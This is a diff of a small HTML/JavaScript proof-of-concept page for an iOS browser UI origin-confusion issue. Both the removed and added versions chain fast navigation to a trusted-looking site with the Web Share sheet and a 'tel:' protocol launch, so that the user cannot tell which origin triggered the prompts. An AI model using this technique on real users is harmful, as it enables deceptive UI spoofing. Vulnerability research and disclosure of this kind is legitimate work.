@@ -1,69 +1,25 @@
 <!doctype html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>iOS UI Origin Desync PoC</title>
-
-<style>
-body {
-  font-family:-apple-system,system-ui;
-  background:#111;
-  color:#fff;
-  height:100vh;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-}
-button {
-  font-size:22px;
-  padding:14px 28px;
-  border:none;
-  border-radius:12px;
-  background:#007aff;
-  color:white;
-}
-</style>
-</head>
-
-<body>
-
-<button id="start">START</button>
+<button id="b">Share</button>
 
 <script>
-let interacted = false;
+document.getElementById('b').onclick = async () => {
+  if (!navigator.share) return;
 
-// detect interaction AFTER navigation
-['click','scroll','touchstart'].forEach(e =>
-  addEventListener(e, () => interacted = true, { once:true })
-);
-
-document.getElementById("start").onclick = async () => {
-
-  // 1️⃣ Navigate to trusted-looking page
-  location.href = "https://apple.com";
-
-  // 2️⃣ After navigation + user interaction → TEL
+  // 1️⃣ Navigasi cepat setelah gesture
   setTimeout(() => {
-    if (interacted) {
-      location.href = "tel:1234";
-    }
-  }, 6000);
+    location.href = 'https://google.com';
+  }, 300);
 
-  // 3️⃣ Share UI race (optional but strong)
-  if (navigator.share) {
-    setTimeout(async () => {
-      try {
-        await navigator.share({
-          title: "Test",
-          text: "Origin confusion test",
-          url: "https://example.com"
-        });
-      } catch {}
-    }, 300);
-  }
+  // 2️⃣ Share Sheet (trusted UI)
+  await navigator.share({
+    title: 'Test',
+    text: 'Chaining test',
+    url: 'https://example.com'
+  });
+
+  // 3️⃣ Setelah Share selesai → external protocol
+  setTimeout(() => {
+    location.href = 'tel:1234';
+  }, 800);
 };
 </script>
-
-</body>
-</html>
-
